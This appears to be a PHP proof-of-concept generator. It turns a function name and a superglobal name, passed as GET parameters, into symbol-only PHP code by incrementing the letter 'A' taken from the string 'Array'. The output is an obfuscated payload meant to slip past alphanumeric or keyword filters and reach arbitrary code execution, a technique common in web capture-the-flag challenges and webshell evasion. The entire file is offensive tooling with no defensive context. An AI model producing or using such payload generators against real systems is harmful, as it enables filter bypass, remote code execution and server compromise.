<?php
highlight_file(__FILE__);
$cmd = strtoupper($_GET['cmd']);
$cmd2 = strtoupper($_GET['post']);
function POC($cmd){
    $i = 0;
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$_ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1);
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}

function POC2($cmd){
    $i = 0;
    echo '$____ = "_";';
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$____ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1).$POC_pat2;
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}

$POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
echo $POC_pat7;
POC($cmd);
POC2($cmd2);


